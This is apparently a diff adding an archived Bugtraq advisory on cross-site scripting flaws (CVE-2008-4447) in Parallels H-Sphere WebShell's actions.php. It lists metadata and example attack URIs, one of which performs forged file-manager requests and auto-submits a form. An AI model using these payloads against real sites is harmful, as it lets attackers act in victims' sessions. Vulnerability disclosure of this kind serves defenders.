@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid31524<p><b><span style="font-size: 18pt;">H-Sphere WebShell 'actions.php' Multiple Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/31524/info">info</a><br><a href="http://www.securityfocus.com/bid/31524/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/31524/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/31524/solution">solution</a><br><a href="http://www.securityfocus.com/bid/31524/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				31524
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2008-4447<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Oct 01 2008 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 07 2015 05:22PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				C1c4Tr1Z
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Parallels H-Sphere WebShell 4.3.10 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	To exploit these issues an attacker entices an unsuspecting user into following a malicious URI.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/actions.php?m=dload&amp;amp;fn=%3Ciframe/src=javascript:alert(%27XSS%27)%3E<br/><br/>http://www.example.com/actions.php?m=search&amp;amp;start=1 POST data: fld=%2F&amp;amp;mask=%3Ciframe%2Fsrc%3Djavascript%3Aalert%280%29%3E<br/><br/>http://www.example.com/actions.php?m=sysinfo&amp;amp;tab=1'&amp;gt;&amp;lt;img/src/onerror=with(new XMLHttpRequest()){open('GET','http://www.victim.com/actions.php?m=futils&amp;amp;ac=mkd',true),send(null),onreadystatechange=function(){if(readyState==4 &amp;amp;&amp;amp; status==200){with(window.open('','_blank')){document.write(responseText.replace(/&amp;lt;\/body&amp;gt;/,'&amp;lt;script&amp;gt;document.getElementsByTagName("input")2.value="XSS";document.forms0.submit();&amp;lt;\/script&amp;gt;&amp;lt;/body&amp;gt;'));document.close();}}};}
+	
+		<ul>
+</ul>
+</div>
